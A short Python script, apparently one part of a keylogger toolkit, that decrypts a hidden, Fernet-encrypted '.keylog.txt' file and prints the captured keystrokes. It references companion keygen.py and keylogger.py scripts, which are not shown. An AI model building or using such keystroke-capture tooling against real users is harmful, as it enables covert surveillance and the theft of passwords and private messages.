# Decrypts encrypted keylog.txt file using Fernet key
# Outputs decrypted keystrokes with timestamps

from cryptography.fernet import Fernet
import base64
import os

#  Step 1: Load the encryption key 
try:
    with open("key.key", "rb") as key_file:
        key = key_file.read()
    fernet = Fernet(key)
except FileNotFoundError:
    print("❌ key.key file not found. Run keygen.py first.")
    exit(1)

#  Step 2: Read the encrypted log file 
try:
    with open(".keylog.txt", "rb") as log_file:
        lines = log_file.readlines()
except FileNotFoundError:
    print("❌ keylog.txt not found. Run keylogger.py first.")
    exit(1)

#  Step 3: Decrypt and print logs 
print("\n🔓 Decrypted Keylog Output:\n")

for i, line in enumerate(lines, 1):
    try:
        # Decode from base64 then decrypt
        encrypted = base64.b64decode(line.strip())
        decrypted = fernet.decrypt(encrypted)
        print(f"{i:03d}: {decrypted.decode()}")
    except Exception as e:
        print(f"[!] Failed to decrypt line {i}: {e}")
